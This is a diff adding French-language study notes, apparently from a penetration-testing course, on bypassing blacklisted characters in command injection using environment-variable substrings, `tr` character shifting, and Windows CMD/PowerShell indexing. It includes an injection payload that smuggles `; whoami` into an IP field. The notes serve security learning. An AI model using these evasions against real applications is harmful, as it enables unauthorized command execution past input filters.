@@ -202,3 +202,57 @@ foreach ($blacklist as $character) {
 
 ---
 
+# Bypassing Other Blacklisted Characters
+
+## Contexte
+- Slash `/` et backslash `\` sont souvent **blacklistés** (utiles pour chemins).  
+- Objectif : générer ces caractères (ou d’autres comme `;`) **sans les taper directement**.
+
+## Linux
+
+### 1. Extraire caractères depuis variables d’environnement
+Exemple avec `$PATH` :  
+`/usr/local/bin:/usr/bin:/bin:/usr/games`
+
+- Slash `/` depuis `$PATH`:  
+  `echo ${PATH:0:1}` → `/`  
+
+- Slash `/` depuis `$HOME` ou `$PWD`:  
+  `echo ${HOME:0:1}` → `/`  
+
+- Point-virgule `;` depuis `$LS_COLORS`:  
+  `echo ${LS_COLORS:10:1}` → `;`
+
+Exemple de payload :  
+`127.0.0.1${LS_COLORS:10:1}${IFS}whoami`  
+→ Injecte `; whoami` sans utiliser `;` ou espace directement.
+
+### 2. Character Shifting (via `tr`)
+- Trouver caractère avant la cible dans ASCII (`man ascii`).  
+  - `\` est 92 → caractère avant `[` (91).  
+- Payload :  
+  `echo $(tr '!-}' '"-~'<<<[)` → `\`
+
+## Windows
+
+### 1. CMD avec variables + substring
+- `%HOMEPATH%` → `\Users\htb-student`  
+- Payload pour isoler `\` :  
+  `echo %HOMEPATH:~6,-11%` → `\`
+
+### 2. PowerShell (variables comme arrays)
+- `$env:HOMEPATH[0]` → `\`  
+- `$env:PROGRAMFILES[10]` → caractère à l’index 10  
+
+Lister toutes les variables dispo :  
+`Get-ChildItem Env:`
+
+## Notes pratiques
+- **Linux** : `${VAR:start:length}`  
+- **Windows CMD** : `%VAR:~start,end%`  
+- **PowerShell** : `$env:VAR[index]`  
+- **ASCII tricks** : utiliser `tr` pour décaler vers caractère cible.  
+
+---
+
+
